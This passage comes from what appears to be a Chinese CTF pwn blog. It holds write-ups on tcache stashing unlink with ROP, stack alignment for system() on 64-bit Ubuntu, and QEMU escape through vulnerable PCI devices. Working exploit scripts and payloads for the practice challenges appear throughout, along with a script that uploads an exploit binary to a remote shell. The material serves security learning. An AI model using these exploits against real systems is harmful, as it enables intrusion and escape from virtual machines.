class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">2</span>,p64(malloc_hook))</span><br><span class="line">    backdoor(shellcode_store(<span class="string">&#x27;orw_64&#x27;</span>))</span><br><span class="line">    backdoor(p64(add_rsp_ret))</span><br><span class="line">    pop_rdi=libc_base+<span class="number">0x0000000000026542</span></span><br><span class="line">    pop_rsi=libc_base+<span class="number">0x0000000000026f9e</span></span><br><span class="line">    pop_rdx=libc_base+<span class="number">0x000000000012bda6</span></span><br><span class="line">    open_addr=libc_base+<span class="number">0x000000000010cc80</span></span><br><span class="line">    read_addr=libc_base+<span class="number">0x000000000010cf70</span></span><br><span class="line">    write_addr=libc_base+<span class="number">0x000000000010d010</span></span><br><span class="line">    flag_addr=libc_base+<span class="number">0x0000000000016239</span></span><br><span class="line">    syscall_addr=libc_base+<span class="number">0x0000000000026bd4</span></span><br><span class="line">    pop_rax=libc_base+<span class="number">0x0000000000047cf8</span></span><br><span class="line">    mprotect_addr=libc_base+<span class="number">0x0000000000117590</span></span><br><span class="line">    </span><br><span class="line">    rop=p64(pop_rdi)+p64((leak_heap&gt;&gt;<span class="number">12</span>)*<span class="number">0x1000</span>)</span><br><span class="line">    rop+=p64(pop_rsi)+p64(<span class="number">0x4000</span>)</span><br><span class="line">    rop+=p64(pop_rdx)+p64(<span class="number">7</span>)</span><br><span class="line">    rop+=p64(mprotect_addr)</span><br><span class="line">    rop+=p64(leak_heap+<span class="number">0x1180</span>)</span><br><span class="line">    rop+=p64(<span class="number">0xdeadbeef</span>)*<span class="number">20</span></span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x16DE</span>,<span class="number">0x16ea</span>,<span class="number">0x16f6</span>,<span class="number">0x1702</span>,<span class="number">0x15C3</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">1</span>,rop)</span><br><span class="line">    </span><br><span class="line">create_chain()</span><br><span class="line">libc_base,leak_heap=leak_addr()</span><br><span class="line">get_into_smallbin()</span><br><span class="line">tcache_stashing_unlink_attack(leak_heap,libc_base)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221026221010006.png" alt="image-20221026221010006"></p><h2 id="参考文章：">参考文章：</h2><p><a href="https://www.anquanke.com/post/id/198173?display=mobile#h2-0">Tcache Stashing Unlink Attack利用思路-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="https://blog.csdn.net/weixin_46521144/article/details/119536209">https://blog.csdn.net/weixin_46521144/article/details/119536209</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tcache stashing unlink attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</title>
      <link href="/posts/75ba47d9.html"/>
      <url>/posts/75ba47d9.html</url>
      
        <content type="html"><![CDATA[<p>有时候在做64位题目的时候会exp完全没问题，但就是获取不了shell。然后通过gdb调试发现是在最后的system函数执行的时候卡住了，然后就满脸疑惑，这也能卡？？？</p><h2 id="为什么执行system函数要栈对齐">为什么执行system函数要栈对齐</h2><p>其实啊，<strong>64位ubuntu18以上系统调用system函数时是需要栈对齐的</strong>。再<strong>具体一点就是64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐</strong>，如果你到system函数执行的时候，si单步进去就会发现，如果没对齐的话，最后就会卡在这里（如下图）。<br><img src="../img/2706180-20220629161534055-1971449802.png" alt=""></p><h2 id="对齐？怎么才算对齐？">对齐？怎么才算对齐？</h2><p>因为64位程序的地址是8字节的，而十六进制又是满16就会进位，因此我们看到的栈地址末尾要么是0要么是8。如下图</p><p><img src="../img/2706180-20220312122451427-1700171694.png" alt=""></p><p>只有当地址的末尾是0的时候，才算是与16字节对齐了，如果末尾是8的话，那就是没有对齐。而我们想要在ubuntu18以上的64位程序中执行system函数，必须要在执行system地址末尾是0。</p><p>下面两个图，分别是没对齐和对齐的情况。</p><p><img src="../img/2706180-20220312122500759-1557162145.png" alt=""></p><p><img src="../img/2706180-20220312122510505-529221181.png" alt=""></p><h2 id="如果执行system的时候没有对齐怎么办？">如果执行system的时候没有对齐怎么办？</h2><p>如果<strong>执行了一个对栈地址的操作指令</strong>（比如pop,ret,push等等，但如果是mov这样的则不算对栈的操作指令），那么<strong>栈地址就会+8或是-8</strong>。<strong>为使rsp对齐16字节，核心思想就是增加或减少栈内容，使rsp地址能相应的增加或减少8字节，这样就能够对齐16字节了。因为栈中地址都是以0或8结尾，0已经对齐16字节，因此只需要进行奇数次pop或push操作，就能把地址是8结尾的rsp变为0结尾，使其16字节对齐。</strong></p><p>这时候有两种解决方法。</p><p>1、去将system函数地址+1，<strong>此处的+1，即是把地址+1，也可以理解为</strong></p><p><strong>+1是为了跳过一条栈操作指令（我们的目的就是跳过一条栈操作指令，使rsp十六字节对齐</strong>，<strong>跳过一条指令，自然就是把8变成0了</strong>）。但又一个问题就是，本来+1是为了跳过一条栈操作指令，但是你也不知道下一条指令是不是栈操作指令，如果不是栈操作指令的话（你加一之后有可能正好是mov这种指令，也有可能人家指令是好几个字节，你加一之后也没有到下一个指令呢），+1也是徒劳的，要么就继续+1，一直加到遇见一条栈操作指令为止（看别的师傅说最大加16次就能成功，不过我不知道为啥）</p><p><img src="../img/2706180-20220312122522900-1221918873.png" alt=""></p><p><strong>可以看见本来我们应该是用401186这个地址的，但是我们现在要跳过一条指令，那自然就是用401187，这样就跳过了push rbp这条指令。</strong></p><p>2、直接在调用system函数地址之前去调用一个ret指令。因为本来现在是没有对齐的，那我现在直接执行一条对栈操作指令（ret指令等同于pop rip，该指令使得rsp+8，从而完成rsp16字节对齐），这样system地址所在的栈地址就是0结尾，从而完成了栈对齐。</p><p>因此payload有两种改法（下面我是以BUUCTF上的rip题目的exp为例）。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28002</span>)</span><br><span class="line">payload=<span class="number">23</span>*<span class="string">&#x27;A&#x27;</span>+p64(<span class="number">0x401186</span>+<span class="number">1</span>)+p64(<span class="number">0</span>)<span class="comment">#加1去跳过一个栈操作指令，使其对齐16字节</span></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;please input&quot;)#这里用recvuntil会报连接超时，因为nc上去发现服务器那边的程序上没有打印这句话</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28002</span>)</span><br><span class="line">payload=<span class="number">23</span>*<span class="string">&#x27;A&#x27;</span>+p64(<span class="number">0x401016</span>)+p64(<span class="number">0x401186</span>)+p64(<span class="number">0</span>)<span class="comment">#0x401016是一个ret指令， p64(0)是system函数的返回地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 探究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈对齐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于qemu逃逸的学习总结</title>
      <link href="/posts/fabe43ff.html"/>
      <url>/posts/fabe43ff.html</url>
      
        <content type="html"><![CDATA[<p>前一段 <code>VNCTF 2023</code> 正好有一道非常入门 <code>qemu</code> 逃逸的题目，正好以此为契机进行 <code>qemu</code> 逃逸的入门学习，在这部分的学习中，要感谢 <strong>winmt</strong> 和 <strong>roderick</strong> 师傅解答我的一些困惑。</p><h2 id="前置知识">前置知识</h2><h3 id="QEMU与逃逸">QEMU与逃逸</h3><p><code>QEMU</code> 是纯软件实现的虚拟化<strong>模拟器</strong>，可以模拟多种不同的计算机系统和硬件设备。虽然 <code>QEMU</code> 可以模拟出硬件或虚拟环境，但它本质上只是一个程序，所谓 <code>qemu</code> 逃逸是指攻击者利用 <code>QEMU</code> 实现的有漏洞的 <code>PCI</code> 设备来获取主机的权限。从虚拟机中 “逃出来”，其利用方式和平常用户程序执行 <code>system</code> 函数是一样的，只不过平常 <code>PWN</code> 题的触发方式是通过用户的输入进行触发，而 <code>QEMU</code> 虚拟机的设备漏洞通过运行在虚拟机上的用户程序对设备的 <code>IO</code> 交互来间接触发。</p><h3 id="PCI设备">PCI设备</h3><p><code>PCI</code> 设备是符合 <code>PCI</code> 总线标准的设备，设备可以申请两类地址空间，分别是 <code>memory space</code> 和 <code>I/O space</code> ，<code>CPU</code> 通过 <code>memory space</code> 访问设备 <code>I/O</code> 的方式称为 <code>memory mapped I/O</code>，也就是 <code>MMIO</code>。通过 <code>I/O space</code> 访问设备 <code>I/O</code> 的方式称为 <code>port mapped I/O</code>，即 <code>PMIO</code>。</p><h3 id="MMIO">MMIO</h3><p><code>MMIO</code> 是指将 <code>I/O</code> 设备的寄存器映射到系统内存地址空间中的一种机制 ，它使用相同的地址总线来处理内存和 <code>I/O</code> 设备，<code>I/O</code> 设备的内存和寄存器被映射到与之相关联的地址。当 <code>CPU</code> 访问某个内存地址时，它可能是物理内存，也可以是某个 <code>I/O</code> 设备的内存，用于访问内存的  <code>CPU</code> 指令也可来访问 <code>I/O</code> 设备。每个 <code>I/O</code> 设备监视 <code>CPU</code> 的地址总线，一旦 <code>CPU</code> 访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳<code> I/O</code>设备，<code>CPU</code> 必须预留给<code>I/O</code> 一个地址区域，该地址区域不能给物理内存使用。</p><p>如果能理解上面所说的 <code>MMIO</code> ，那么就不得不提 <code>xxx_mmio_read</code> 和 <code>xxx_mmio_write</code> 这两个函数了（ <code>xxx</code> 是设备名），<code>xxx_mmio_read</code> 函数用于从虚拟设备的 <code>MMIO</code> 地址空间中读取数据，而 <code>xxx_mmio_write</code> 函数则是向指定的 <code>MMIO</code> 地址空间中写入数据。<code>qemu</code> 会监听读写操作，当监听到读写后，就会调用这两个函数。</p><h3 id="PMIO">PMIO</h3><p><code>PMIO</code> 允许CPU通过专用的指令进行输入 输出操作，而不是将I/O设备视为内存中的特殊位置,在 <code>PMIO</code> 中，内存和 <code>I/O</code> 设备有各自的地址空间。 端口映射 <code>I/O</code> 通常使用一种特殊的 <code>CPU</code> 指令，专门执行 <code>I/O</code> 操作。在 <code>Intel</code> 的微处理器中，使用的指令是 <code>IN</code> 和 <code>OUT</code>。这些指令可以读/写 1,2,4 个字节（例如：outb, outw, outl）到 <code>IO</code> 设备上。<code>I/O</code> 设备有一个与内存不同的地址空间，为了实现地址空间的隔离，要么在 <code>CPU</code> 物理接口上增加一个 <code>I/O</code> 引脚，要么增加一条专用的 <code>I/O</code> 总线。</p><h3 id="什么是QOM？">什么是QOM？</h3><p><code>QOM</code>  <code>（QEMU Object Model）</code> 是 <code>QEMU</code> 的一个核心概念，它是 <code>QEMU</code> 在 <code>C</code> 的基础上自己实现了一套面向对象机制，支持多种体系结构和设备。在 <code>QOM</code> 中，每个设备都被表示为一个对象，对象有一个类型，该类型定义了设备的属性和行为。通过 <code>QOM</code>，开发者可以很方便地添加新的设备和扩展现有设备的功能，从而使 <code>QEMU</code>变得更加强大和灵活。</p><h2 id="题目练习">题目练习</h2><h3 id="escape-langlang-mountain">escape_langlang_mountain</h3><p>题目附件在 <code>buu</code> 的 <code>vnctf 2023</code> 的比赛里就有</p><h4 id="简单分析">简单分析</h4><p>作为一名合格的菜鸡，刚开始连咋启动 <code>qemu</code> 都不知道，这里标明一下这俩文件。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251623441.png" alt="image-20230225162320163"></p><p>如果有 <code>qemu</code> 的话，那么直接 <code>./launch.sh</code> 就可以启动了。如果没有的话就 <code>sudo apt install qemu-system</code> 安装一下即可，如果还运行不了的话就 <code>ldd</code> 看一下是不是少什么库了，少哪个装哪个就行（具体做法可以参考文末的 <strong>奇奇怪怪的技能</strong> 部分 ）</p><p>通过查看 <code>launch.sh</code> 文件我们可以知道设备的名称叫做 <code>vn</code> （如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251629467.png" alt="image-20230225162953416"></p><p>接下来打开 <code>ida</code> 进行分析，正常的话看到的是多到让人懵逼的代码。</p><p>我们的思路是先定位到 <code>vn_class_init</code> 函数，因为去除了符号表，所以这里得根据特征来识别</p><p>我这里参考的是 <strong>winmt</strong> 师傅给我推荐的代码  <a href="https://github.com/qemu/qemu/blob/master/hw/misc/edu.c">QEMU educational PCI device</a> ，下面所提到的特征都是根据对比这个模板来进行判断的</p><p>我个人认为这个 <code>vn_class_init</code> 一个显著特征就是有如下的 <code>id</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251638167.png" alt="image-20230225163814127"></p><p>所以我们搜索 <code>vn_class_init</code> 字符串再结合下面这个特征来寻找 <code>vn_class_init</code> 函数，从而判断出来下面这个函数就是 <code>vn_class_init</code> 函数。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251640026.png" alt="image-20230225164013977"></p><p>我们在本地启动 <code>qemu</code> 后，根据 <code>lspci</code> 命令得到的结果（比如出现的 <code>0420</code> 和 <code>1337</code> ）与上面 <code>vn_class_init</code> 函数中的 <code>PCI</code> 信息比较一下得知 <code>vn</code> 这个设备号是 <code>04</code> （这个信息在写脚本的时候会用到）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251642828.png" alt="image-20230225164210745"></p><p>而之所以上面那里判断 <code>sub_6d9166</code> 为 <code>pci_vn_realize</code> 是因为模板代码中在 <code>xxx_class_init</code> 函数中这里有将 <code>pci_xxx_realize</code> 的函数地址赋值给结构体的成员变量（这些所谓的特征来判断，都是我自己的猜测，无法保证一定正确）</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251754897.png" alt="image-20230225175449806" style="zoom:50%;" /><p>进入 <code>pci_vn_realize</code> 函数，我们这里可以继续对比模板代码（如下），猜测 <code>sub_54ABB5</code> 函数是 <code>memory_region_init_io</code>  ，原因是这个函数出现了 <code>vn_mmio</code> 这个字符串，并且参数也符合 <code>memory_region_init_io</code> 的特征。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251758656.png" alt="image-20230225175818596"></p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251801455.png" alt="image-20230225180116377" style="zoom:50%;" /><p>而 <code>memory_region_init</code> 函数的第三个参数，是 <code>vn_mmio_ops</code> ，它通常是用于访问 <code>MMIO</code> 寄存器的函数集合，这里面存放了 <code>vn_mmio_read</code> 和 <code>vn_mmio_write</code> 的函数指针（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251807914.png" alt="image-20230225180705872"></p><h4 id="漏洞利用">漏洞利用</h4><p>我们再来看 <code>vn_mmio_read</code> 函数代码（如下）</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251808609.png" alt="image-20230225180803560" style="zoom:50%;" /><p>这个代码很短，如果 <code>a2</code> 满足 <code>((a2 &gt;&gt; 20) &amp; 0xF) == 1</code> 和 <code>((a2 &gt;&gt; 16) &amp; 0xF) == 0xF</code> ,那么就可以将字符串 <code>vnctf</code> 复制到 <code>dword_137A358</code> 的地址上。这里很明显是模拟了 <code>mmio_read</code> 函数的功能，即 <code>MMIO</code> 读取数据到 <code>qemu</code> 模拟的内存里，所以最后的 <code>memcpy</code> 函数就是在做这个，而 <code>vnctf</code> 字符串也就是要从 <code>MMIO</code> 里获取的数据。</p><p>再看 <code>vn_mmio_write</code> 函数代码（如下）</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302251820483.png" alt="image-20230225182013429" style="zoom:50%;" /><p>这里发现了后门函数，如果要触发 <code>system</code> 的话，需要让 <code>a2</code> 为 <code>0x2f0000</code> （简单算一下就行），如果想让 <code>command</code> 为 <code>cat flag</code> 字符串的话，需要让 <code>a2</code> 为 <code>0x100000</code> ，所以这个 <code>vn_mmio_write</code>  要执行两次。</p><h4 id="EXP的编写">EXP的编写</h4><p>上面似乎一切都顺理成章，但我们好像忘记了，如何调用 <code>vn_mmio_read</code> 和 <code>vn_mmio_write</code> 函数并且控制他们的参数？</p><p><code>QEMU</code> 实现 <code>MMIO</code> 模拟的其中一个因素就是<strong>监控虚拟机对 <code>MMIO</code> 内存的读写，触发对应的回调函数的执行</strong>。假设我现在对 <code>MMIO</code> 内存进行了读的操作，那么 <code>qemu-system-x86_64</code> 程序中的 <code>vn_mmio_read</code> 回调函数则会被触发，而它的参数，也就是读的 <code>MMIO</code> 地址。</p><p>所以我们可以编写一个 <code>C</code> 代码（如下），来对 <code>MMIO</code> 内存进行读的操作（ <code>mmio_mem</code> 是 <code>MMIO</code> 区域的起始地址），之所以这段代码进行了读的操作是因为 <code>return *(mmio_mem + addr)</code> 将 <code>MMIO</code> 区域中的数据读了出来并返回。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *((<span class="type">uint64_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line">mmio_read(<span class="number">0x1f0000</span>);</span><br></pre></td></tr></table></figure><p>依次类推 <code>mmio_write</code> 函数是同理，向 <code>MMIO</code> 区域中写入数据，从而触发回调函数 <code>vn_mmio_write</code> ，这里的 <code>value</code> 无所谓，而 <code>addr</code> 则会当做参数传递给 <code>vn_mmio_write</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">  *((<span class="type">uint64_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line">mmio_write(<span class="number">0x100000</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>为了获取 <code>MMIO</code> 区域的首地址，我们需要打开其设备的 <code>resource0</code> 文件，使用 <code>mmap</code> 函数将其映射到用户空间上，最终实现了对 <code>MMIO</code> 区域的访问。还记得前面所说的设备号 <code>04</code> 么，接下来 <code>open</code> 的时候需要用到。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *((<span class="type">uint64_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">  *((<span class="type">uint64_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR</span><br><span class="line">| O_SYNC);</span><br><span class="line">  <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">    die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line">  mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd,</span><br><span class="line"><span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">    die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line">  mmio_read(<span class="number">0x1f0000</span>);</span><br><span class="line">  mmio_write(<span class="number">0x100000</span>, <span class="number">1</span>);</span><br><span class="line">  mmio_write(<span class="number">0x2f0000</span>, <span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个脚本是 <strong>winmt</strong> 师傅写的，整体思路就是先获取 <code>MMIO</code> 的起始地址，然后进行一次读，两次写的操作，以此来触发回调函数，最终触发了 <code>system(&quot;cat flag&quot;)</code> 。因为这个 <code>qemu_system</code> 程序还是跑在宿主机上的，所以在这个程序中执行 <code>system(&quot;cat flag&quot;)</code> 读取的是宿主机的 <code>flag</code> 从而完成的逃逸，这和 <code>glibc</code> 的题目获取 <code>shell</code> 其实一样，不过最初我以为这个 <code>qemu_system</code> 程序就是在 <code>qemu</code> 里面，所以执行了 <code>system</code> 也是在 <code>qemu</code> 里面所执行的。</p><p>上面这个脚本用 <code>musl-gcc</code> 所编译为静态链接的程序（用 <code>musl-gcc</code> 编译是因为这样生成的程序体积更小，静态链接的程序是因为远程环境有时候没有动态链接库）</p><p>编译命令为 <code>musl-gcc exp.c -o exp -static</code> <strong>（ <code>musl-gcc</code> 的编译与配置写到了文末 奇奇怪怪的技能 部分）</strong></p><p>如果打远程的话，则需要使用上传脚本（如下，这依然是 <strong>winmt</strong> 师傅所编写的）</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, os</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25692</span>)</span><br><span class="line">os.system(<span class="string">&quot;gzip -c ./exp &gt; ./exp.gz&quot;</span>)<span class="comment">#将c脚本编译并命名为 exp</span></span><br><span class="line">os.system(<span class="string">&quot;base64 ./exp.gz &gt; ./b64_exp&quot;</span>)</span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">&quot;./b64_exp&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">content = fd.read()</span><br><span class="line">length = <span class="built_in">len</span>(content)</span><br><span class="line">fd.close()</span><br><span class="line">per_length = <span class="number">0x200</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length, per_length) :</span><br><span class="line">cmd = <span class="string">&quot;echo &#x27;&quot;</span> + content[i : i + per_length] + <span class="string">&quot;&#x27; &gt;&gt; ./b64_exp&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, cmd)</span><br><span class="line"><span class="keyword">if</span> length - i &gt; <span class="number">0</span> :</span><br><span class="line">cmd = <span class="string">&quot;echo &#x27;&quot;</span> + content[i : length + <span class="number">1</span>] + <span class="string">&quot;&#x27; &gt;&gt; ./b64_exp&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, cmd)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;base64 -d ./b64_exp &gt; ./exp.gz&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;gunzip ./exp.gz&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;chmod +x ./exp&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;# &quot;</span>, <span class="string">&quot;./exp&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302261430662.png" alt="image-20230226143001990" style="zoom:50%;" /><h3 id="strng">strng</h3><p>这个的题目链接在 <a href="https://github.com/rcvalle/blizzardctf2017/releases">这里</a></p><p>然后启动脚本用这个 ，自己创建一个 <code>launch.sh</code> 文件就行（通过这个启动脚本可以发现，这个设备名叫做 <code>strng</code>）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">    -device strng \</span><br><span class="line">    -hda my-disk.img \</span><br><span class="line">    -hdb my-seed.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,id=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure><p>启动之后，发现这模拟的是一个 <code>ubuntu</code> 虚拟机，然后登录的用户名是 <code>ubuntu</code> ， 密码是 <code>passw0rd</code> 。</p><h4 id="代码逆向">代码逆向</h4><p>这个 <code>qemu-system-x86_64</code> 没有去除符号表，但是开了 <code>PIE</code> 。我们的逆向思路是去搜索函数名中存在 <code>strng</code> 字符串的函数，这样可以更快定位到关键函数。</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011317071.png" alt="image-20230301131745963" style="zoom:50%;" /><p>我们从 <code>strng_class_init</code> 函数入手分析（如下），根据这里的数据可以分析出来设备号</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011318907.png" alt="image-20230301131847811" style="zoom:50%;" /><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011329170.png" alt="image-20230301132945008" style="zoom:50%;" /><p>如上，可以知道 <code>strng</code> 的设备为 <code>00:03:0</code></p><p>然后来依次分析 <code>strng_mmio_read</code>  <code>strng_mmio_write</code> <code>strng_pmio_read</code> <code>strng_pmio_write</code> 这四个函数，在分析之前，需要把这四个函数的第一个参数 <code>opaque</code> 的类型改为 <code>STRNGState *</code> ，这样可以让 <code>ida</code> 识别出来这个结构体，至于为什么这里要修改成 <code>STRNGState *</code>  类型，个人猜测可能这个位置正常的参数类型就是 <code>xxxState *</code> （ <code>xxx</code> 是设备名）</p><p><code>STRNGState</code> 的结构体定义如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PCIDevice pdev;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    MemoryRegion pmio;</span><br><span class="line">    <span class="type">uint32_t</span> addr;</span><br><span class="line">    <span class="type">uint32_t</span> regs[STRNG_MMIO_REGS];</span><br><span class="line">    <span class="type">void</span> (*srand)(<span class="type">unsigned</span> <span class="type">int</span> seed);</span><br><span class="line">    <span class="type">int</span> (*rand)(<span class="type">void</span>);</span><br><span class="line">    <span class="type">int</span> (*rand_r)(<span class="type">unsigned</span> <span class="type">int</span> *seed);</span><br><span class="line">&#125; STRNGState;</span><br></pre></td></tr></table></figure><p><code>strng_mmio_read</code> 函数中如果满足 <code>if</code> 的话就返回 <code>regs</code> 数组里的值，</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011442913.png" alt="image-20230301144200823"></p><p><code>strng_mmio_write</code> 函数是用 <code>judge</code> 做了三个选择，如果 <code>judge</code> 为 <code>0</code> 就执行结构体中的 <code>srand(val)</code> ，如果为 <code>1</code> 则执行 <code>rand()</code>，如果 <code>judge</code> 为 <code>3</code> 就执行  <code>rand_r(&amp;strng-&gt;regs[2])</code> 以及 <code>regs[judge] = val</code> ，否则的话 <code>judge</code> 存在但不为 <code>3</code> ，就执行 <code>regs[judge] = val</code>。这里是存在一个 <code>regs</code> 数组的任意赋值的，索引和参数都可控</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011451484.png" alt="image-20230301145112412" style="zoom:50%;" /><p><code>strng_pmio_read</code> 函数存在一个任意地址读，以此来泄露结构体中 <code>regs</code> 数组下面的函数地址。正常来说的话 <code>mmio_read</code> 函数那里的任意地址读，也是可以完成的，但是实践了一下，一直没办法用 <code>mmio_read</code> 泄露出来 <code>libc</code> 数据</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011534573.png" alt="image-20230301153424430" style="zoom:50%;" /><p><code>strng_pmio_write</code> 函数最重要的有三个点，第一是 <code>opaque-&gt;addr</code> 